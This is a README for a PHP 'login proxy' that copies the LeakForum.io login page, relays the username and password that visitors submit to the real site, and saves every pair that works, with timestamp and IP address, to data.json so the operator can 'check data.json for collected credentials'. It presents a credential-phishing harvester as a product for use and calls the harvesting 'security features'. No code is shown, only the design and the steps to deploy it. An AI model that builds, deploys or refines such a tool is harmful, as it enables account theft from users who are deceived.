# LeakForum Login Proxy

This is a PHP-based proxy system that intercepts login attempts and forwards them to the real LeakForum.io website.

## How It Works

1. **Display Form**: When you access `member.php`, it shows a login form that looks like the original LeakForum login page.

2. **Process Credentials**: When a user submits the form, the proxy:
   - Takes the username and password
   - Makes a curl request to `https://leakforum.io/member.php` with the exact same headers and cookies as provided
   - Analyzes the response

3. **Handle Responses**:
   - **Success**: If the response contains "You have successfully been logged in."
     - Saves the credentials to `data.json` 
     - Returns the success HTML to the user
   - **Error**: If the response contains "Please correct the following errors before continuing"
     - Returns the error HTML to the user
   - **Other**: Returns the full response for any unexpected results

## Files

- `member.php` - Main proxy script
- `data.json` - Stores successful login credentials (created automatically)
- `member_sucess.php` - Original success page (reference)
- `member_unsucesfull.php` - Original error page (reference)

## Data Storage Format

Successful credentials are stored in `data.json` with this structure:

```json
{
    "successful_logins": [
        {
            "username": "example_user",
            "password": "example_pass",
            "timestamp": "2025-01-06 10:30:45",
            "ip_address": "192.168.1.100"
        }
    ]
}
```

## Security Features

- Uses the exact same curl headers and cookies as the provided example
- Generates random post keys for CSRF protection
- Stores IP addresses with credentials for tracking
- Uses proper PHP security practices

## Usage

1. Place all files in your web server directory
2. Access `member.php` in your browser
3. Users will see the login form
4. Successful logins will be saved to `data.json`
5. Check `data.json` for collected credentials

## Requirements

- PHP 7.0+
- curl extension enabled
- Write permissions for the directory (to create data.json)

## Notes

- This proxy mimics the exact curl request provided in the original specification
- All responses (success/error) are passed through to the user unchanged
- The system automatically handles different response types from the remote server 